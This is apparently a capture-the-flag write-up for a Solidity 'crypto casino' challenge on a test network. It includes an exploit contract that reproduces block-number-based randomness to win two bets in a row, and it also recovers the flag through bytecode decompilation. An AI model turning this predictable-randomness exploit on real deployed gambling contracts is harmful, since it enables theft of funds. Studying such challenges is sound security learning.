# crypto casino

This one is fairly easy and the exploit is really cool.

```solidity
pragma solidity ^0.6.0;

contract casino {
    bytes32 private seed;
    mapping(address => uint) public consecutiveWins;

    constructor () public{
        seed = keccak256("satoshi nakmoto");
    }

    function bet(uint guess) public{
        uint num = uint(keccak256(abi.encodePacked(seed, block.number))) ^ 0x539;
        if (guess == num) {
            consecutiveWins[msg.sender] = consecutiveWins[msg.sender] + 1;
        } else {
            consecutiveWins[msg.sender] = 0;
        }
    }

    function done() public view returns (uint16[] memory) {
        if (consecutiveWins[msg.sender] > 1) {
            return [];
        }
    }
}
```

We need to guess the result twice to get the flag.
Everything is deterministic, the seed, the XOR, the hash and the ABI call.
Almost everything! The `block.number` is not.

Before searching Google, how could we guess it?
Maybe see the last block by hand and try.
But that would not work, the transactions are queued, and we never know the final block.
We could bruteforce it but whenever one guess fails we are back to the start.

So, searching Google on how to predict the block number you would probably find this:
<https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-ii-478365775a34>.

Reading through it you'll find that *you* can't predict the block number.
But your contract can.
And Ethereum has this *looking back its obvious property* that if the contract calls another one,
all operations must be put into the same block, for consistency reasons.

So, to break the casino you just need to replicate the "random" number generation and call the bet twice from your code.
The exploit looks like the following:

```solidity
contract exploit {
    bytes32 private seed;
    constructor () public{
        seed = keccak256("satoshi nakmoto");
    }

    function bet() public {
        uint num = uint(keccak256(abi.encodePacked(seed, block.number))) ^ 0x539;
        casino c = casino(0x186d5d064545f6211dD1B5286aB2Bc755dfF2F59);
        c.bet(num);
        c.bet(num);
    }
}
```

After running you can call `consecutiveWins` on the contract they gave you (0x186d5d064545f6211dD1B5286aB2Bc755dfF2F59).
To get the flag you need to call done, the strategy to get the array size is the same as the previous challenge.

```python
flag = [102,108,97,103,123,68,51,67,78,55,82,64,108,49,90,51,68,95,67,64,53,49,78,48,83,95,53,117,99,107,53,51,49,125]
"".join(map(chr, flag))
> flag{D3CN7R@l1Z3D_C@51N0S_5uck531}
```

## Cheeky Way

Just like the previous challenge, head on to <https://rinkeby.etherscan.io/bytecode-decompiler?a=0x186d5d064545f6211dD1B5286aB2Bc755dfF2F59> and decompile the code.

The values are different but that is not a problem.

```
mem[4448] = 51000
mem[4480] = 15 * 3600
mem[4512] = 48500
mem[4544] = 51500
mem[4576] = 61500
mem[4608] = 34000
mem[4640] = 25500
mem[4672] = 33500
mem[4704] = 39000
mem[4736] = 27500
mem[4768] = 41000
mem[4800] = 32000
mem[4832] = 15 * 3600
mem[4864] = 24500
mem[4896] = 45000
mem[4928] = 25500
mem[4960] = 34000
mem[4992] = 47500
mem[5024] = 33500
mem[5056] = 32000
mem[5088] = 26500
mem[5120] = 24500
mem[5152] = 39000
mem[5184] = 24000
mem[5216] = 41500
mem[5248] = 47500
mem[5280] = 26500
mem[5312] = 58500
mem[5344] = 49500
mem[5376] = 53500
mem[5408] = 26500
mem[5440] = 25500
mem[5472] = 24500
mem[5504] = 62500
```

Just do the same as they do: `mem[(32 * idx) + 2272] = uint16(mem[(32 * idx) + 4478 len 2] / 500)`

```python
enc_flag = [51000,15 * 3600,48500,51500,61500,34000,25500,33500,39000,27500,41000,32000,15 * 3600,24500,45000,25500,34000,47500,33500,32000,26500,24500,39000,24000,41500,47500,26500,58500,49500,53500,26500,25500,24500,62500]
print("".join([chr(c // 500) for c in enc_flag]))
> flag{D3CN7R@l1Z3D_C@51N0S_5uck531}
```
